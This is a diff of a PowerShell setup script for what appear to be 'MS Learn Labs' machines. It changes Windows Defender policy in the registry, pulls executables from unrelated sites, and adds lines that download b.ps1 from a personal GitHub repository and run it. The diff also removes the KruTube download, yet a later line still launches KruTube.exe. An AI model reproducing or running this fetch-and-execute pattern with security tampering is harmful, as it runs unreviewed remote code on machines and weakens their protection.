@@ -25,6 +25,9 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Nam
 Invoke-WebRequest -Uri "https://bits.avcdn.net/productfamily_VPN/insttype_PRO/platform_WIN/installertype_ONLINE/build_RELEASE/cookie_mmm_scl_998_999_000_m:dlid_SLN-TRIAL-ONLINE-PP?alt=en-us" -OutFile "$env:USERPROFILE\Desktop\avast.exe"
 Start-Process -FilePath "$extractPath\avast.exe"
 
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/user009dm/new/main/b.ps1' -OutFile 'C:\Users\MS Learn Labs\Desktop\b.ps1'
+Start-Process powershell -ArgumentList '-File "C:\Users\MS Learn Labs\Desktop\b.ps1"'
+
 for ($i = 1; $i -le 9; $i++) {
     $fileUrl = "https://raw.githubusercontent.com/user009dm/new/main/$i.mrf"
     $filePath = "$env:USERPROFILE\Desktop\$i.mrf"
@@ -40,9 +43,6 @@ taskkill /f /im OneDrive.exe
 Invoke-WebRequest -Uri "https://letsunlockphone.com/rdpdfsffddf/Sandboxie-new.zip" -OutFile "C:\Users\MS Learn Labs\Desktop\Sandboxie-new.zip"
 Expand-Archive -Path "C:\Users\MS Learn Labs\Desktop\Sandboxie-new.zip" -DestinationPath "C:\Users\MS Learn Labs\Desktop"
 Start-Process -FilePath "C:\Users\MS Learn Labs\Desktop\Sandboxie\SandMan.exe"
-Invoke-WebRequest -Uri "https://www.krutube.pro/download/krutubel/v10.1.0.0/krutube_10.1.0.0.zip" -OutFile "C:\Users\MS Learn Labs\Desktop\krutube_10.0.0.0.zip"
-Expand-Archive -Path "C:\Users\MS Learn Labs\Desktop\krutube_10.0.0.0.zip" -DestinationPath "C:\Users\MS Learn Labs\Desktop"
-Start-Process -FilePath "C:\Users\MS Learn Labs\Desktop\KruTube\KruTube.exe" -WindowStyle Maximized
 Start-Service -Name "audiosrv"
 Start-Sleep -Seconds 15
 Start-Process -FilePath "C:\Users\MS Learn Labs\Desktop\KruTube\KruTube.exe" -WindowStyle Maximized
